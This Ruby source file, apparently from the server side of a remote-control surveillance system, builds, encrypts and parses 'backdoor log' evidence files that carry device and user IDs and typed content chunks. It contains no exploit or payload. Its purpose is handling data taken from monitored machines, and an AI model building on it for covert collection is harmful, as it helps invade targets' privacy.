#
# Evidence factory (backdoor logs)
#

# relatives
require_relative 'crypt'
require_relative 'time'
require_relative 'utf16le'

# RCS::Common
require 'rcs-common/crypt'
require 'rcs-common/utf16le'

# system
require 'securerandom'

# evidence types
require 'rcs-common/evidence/common'

Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS

class Evidence
  
  extend Crypt
  include Crypt
  
  attr_reader :size
  attr_reader :content
  attr_reader :name
  attr_reader :timestamp
  attr_reader :info
  attr_reader :version
  attr_reader :type
  attr_writer :info
  
  def self.VERSION_ID
    2008121901
  end
  
  def clone
    return Evidence.new(@key, @info)
  end
  
  def initialize(key, info = {})
    @key = key
    @version = Evidence.VERSION_ID
    @info = Hash.new.merge info
    @info[:empty] = false
  end
  
  def extend_on_type(type)
    extend instance_eval "#{type.to_s.capitalize}Evidence"
  end
  
  def extend_on_typeid(id)
    extend_on_type EVIDENCE_TYPES[id]
  end
  
  def generate_header(type_id)
    thigh, tlow = @info[:acquired].to_filetime
    deviceid_utf16 = @info[:device_id].to_utf16le_binary
    userid_utf16 = @info[:user_id].to_utf16le_binary
    sourceid_utf16 = @info[:source_id].to_utf16le_binary
    
    add_header = ''
    add_header = additional_header if respond_to? :additional_header
    
    additional_size = add_header.bytesize
    struct = [Evidence.VERSION_ID, type_id, thigh, tlow, deviceid_utf16.bytesize, userid_utf16.bytesize, sourceid_utf16.bytesize, additional_size]
    header = struct.pack("I*")
    
    header += deviceid_utf16
    header += userid_utf16
    header += sourceid_utf16
    header += add_header.to_binary
    
    return header
  end
  
  def align_to_block_len(len)
    rest = len % 16
    len += (16 - rest % 16) unless rest == 0
    len
  end
  
  def encrypt(data)
    rest = align_to_block_len(data.bytesize) - data.bytesize
    data += "a" * rest
    return aes_encrypt(data, @key, PAD_NOPAD)
  end
  
  def decrypt(data)
    return aes_decrypt(data, @key, PAD_NOPAD)
  end
  
  def append_data(data, len = data.bytesize)
    [len].pack("I") + data
  end
  
  # factory to create a random evidence
  def generate(type)
    @name =  SecureRandom.hex(16)
    @info[:acquired] = Time.now.utc
    @info[:type] = type
    
    # extend class on requested type
    extend_on_type @info[:type]
    
    # header
    type_id = EVIDENCE_TYPES.invert[type]
    header = generate_header(type_id)
    @binary = append_data(encrypt(header))
    
    # content
    if respond_to? :generate_content
      chunks = generate_content
      chunks.each do | c |
        @binary += append_data( encrypt(c), c.bytesize )
      end
    end
    
    return self
  end
  
  def size
    @binary.bytesize
  end
  
  # save the file in the specified dir
  def dump_to_file(dir)
    # dump the file (using the @name) in the 'dir'
    File.open(dir + '/' + @name, "wb") do |f|
      f.write(@binary)
    end
  end
  
  # load an evidence from a file
  def load_from_file(file)
    # load the content of the file in @content
    File.open(file, "rb") do |f|
      @binary = f.read
      @name = File.basename f
    end
    
    return self
  end

  def read_uint32(data)
    data.read(4).unpack("I").shift
  end

  def empty?
    @info[:empty]
  end
  
  def deserialize(data)
    
    raise EvidenceDeserializeError.new("no content!") if data.nil?
    binary_string = StringIO.new data
    
    # header
    header_length = read_uint32(binary_string)
    
    @info[:empty] = (binary_string.size == header_length + 4)
    
    # decrypt header
    header_string = StringIO.new decrypt(binary_string.read header_length)
    @version = read_uint32(header_string)
    @type_id = read_uint32(header_string)
    time_h = read_uint32(header_string)
    time_l = read_uint32(header_string)
    host_size = read_uint32(header_string)
    user_size = read_uint32(header_string)
    ip_size = read_uint32(header_string)
    additional_size = read_uint32(header_string)
    
    # check that version is correct
    raise EvidenceDeserializeError.new("mismatching version [expected #{Evidence.VERSION_ID}, found #{@version}]") unless @version == Evidence.VERSION_ID
    
    @info[:received] = Time.new.getgm
    @info[:acquired] = Time.from_filetime(time_h, time_l).getgm

    @info[:device_id] = header_string.read(host_size).utf16le_to_utf8 unless host_size == 0
    @info[:device_id] ||= ''
    @info[:user_id] = header_string.read(user_size).utf16le_to_utf8 unless user_size == 0
    @info[:user_id] ||= ''
    @info[:source_id] = header_string.read(ip_size).utf16le_to_utf8 unless ip_size == 0
    @info[:source_id] ||= ''
    
    # extend class depending on evidence type
    begin
      @info[:type] = EVIDENCE_TYPES[ @type_id ]
      extend_on_type @info[:type]
    rescue Exception => e
      raise EvidenceDeserializeError.new("unknown type")
    end
    
    unless additional_size == 0
      additional_data = header_string.read additional_size
      decode_additional_header(additional_data) if respond_to? :decode_additional_header
    end
    
    # split content to chunks
    @info[:chunks] = []
    while not binary_string.eof?
      len = read_uint32(binary_string)
      content = binary_string.read align_to_block_len(len)
      @info[:chunks] << StringIO.new( decrypt(content) ).read(len)
    end
    
    return @info[:empty] ? [self] : decode_content
  end
  
end

end # RCS::
